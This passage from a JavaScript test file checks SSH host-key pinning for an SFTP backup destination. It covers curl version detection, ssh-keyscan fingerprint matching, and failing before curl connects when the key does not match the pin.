        return { code: 0, stdout: '', stderr: '', bin, argv };
      }
      throw new Error(`unexpected program ${bin} ${argv.join(' ')}`);
    });
    return curlCalls;
  }
  const restore = () => { exec.mockRestore(); hasBinary.mockRestore(); resetCurlVersionCache(); };

  it('parses curl versions and knows which ones pin a host key themselves', () => {
    expect(parseCurlVersion('curl 7.76.1 (x86_64-redhat-linux-gnu) libcurl/7.76.1 OpenSSL/3.0.7')).toEqual({ major: 7, minor: 76 });
    expect(parseCurlVersion('curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0')).toEqual({ major: 8, minor: 5 });
    expect(parseCurlVersion('garbage')).toBeNull();
    expect(curlPinsHostKey({ major: 7, minor: 76 })).toBe(false);
    expect(curlPinsHostKey({ major: 7, minor: 80 })).toBe(true);
    expect(curlPinsHostKey({ major: 8, minor: 5 })).toBe(true);
    expect(curlPinsHostKey(null)).toBe(false);
  });

  it('computes OpenSSH SHA-256 fingerprints from ssh-keyscan output and keeps only the pinned key', () => {
    expect(matchHostKeyLines(keyscan, ED25519_FP)).toEqual({ matched: [`[sftp.example.com]:2222 ssh-ed25519 ${ED25519_KEY}`], offered: [`ssh-ed25519 SHA256:${ED25519_FP}`, 'ssh-rsa SHA256:wCMjzvbInnSbJ3VExMnOmEIIhhGoPI5YapeggpbXrdQ'] });
    expect(matchHostKeyLines(keyscan, `${ED25519_FP}=`).matched).toHaveLength(1);
    expect(matchHostKeyLines(keyscan, 'A'.repeat(43)).matched).toEqual([]);
    expect(matchHostKeyLines('', ED25519_FP)).toEqual({ matched: [], offered: [] });
  });

  it('on curl < 7.80 verifies the key with ssh-keyscan and hands curl a private known_hosts instead of hostpubsha256', async () => {
    exec.mockClear();
    const curlCalls = mockHost({ version: '7.76.1' });
    try {
      const out = await runOp('backup.destination.test', { config: sftp }, ctx);
      expect(out.ok, out.message).toBe(true);
      const scan = exec.mock.calls.find(([bin]) => bin === 'ssh-keyscan');
      expect(scan[1]).toEqual(['-p', '2222', '-T', '15', '--', 'sftp.example.com']);
      expect(curlCalls.length).toBeGreaterThanOrEqual(1);
      for (const call of curlCalls) {
        expect(call.cnf).not.toMatch(/hostpubsha256|insecure/);
        expect(call.home).toMatch(/^\/tmp\/whm\/backup-sshhome-/);
        expect(call.knownHosts).toBe(`[sftp.example.com]:2222 ssh-ed25519 ${ED25519_KEY}\n`);
        expect(fs.existsSync(call.home)).toBe(false);
      }
    } finally { restore(); }
  });

  it('on curl < 7.80 a key that does not match the pin, or a missing ssh-keyscan, fails before curl connects', async () => {
    exec.mockClear();
    let curlCalls = mockHost({ version: '7.76.1' });
    try {
      const out = await runOp('backup.destination.test', { config: { ...sftp, hostKeySha256: 'A'.repeat(43) } }, ctx);
      expect(out).toMatchObject({ ok: false, code: 'destination_failed' });
      expect(out.message).toMatch(/does not match the pinned fingerprint/);
      expect(out.message).toContain(`ssh-ed25519 SHA256:${ED25519_FP}`);
      expect(curlCalls).toEqual([]);
    } finally { restore(); }
    exec.mockClear();
    curlCalls = mockHost({ version: '7.76.1', keyscanAvailable: false });
    try {
      const out = await runOp('backup.destination.test', { config: sftp }, ctx);
      expect(out).toMatchObject({ ok: false, code: 'destination_failed' });
      expect(out.message).toMatch(/install ssh-keyscan/);
      expect(curlCalls).toEqual([]);
      expect(exec.mock.calls.some(([bin]) => bin === 'ssh-keyscan')).toBe(false);
    } finally { restore(); }
  });

  it('on curl >= 7.80 keeps hostpubsha256 in the config and never runs ssh-keyscan', async () => {
    exec.mockClear();
    const curlCalls = mockHost({ version: '8.5.0' });
    try {
      const out = await runOp('backup.destination.test', { config: sftp }, ctx);
      expect(out.ok, out.message).toBe(true);
      expect(exec.mock.calls.some(([bin]) => bin === 'ssh-keyscan')).toBe(false);
      expect(curlCalls.length).toBeGreaterThanOrEqual(1);
      for (const call of curlCalls) {
        expect(call.cnf).toContain(`hostpubsha256 = "${ED25519_FP}"`);
        expect(call.home).toBeNull();
      }
    } finally { restore(); }
  });
});
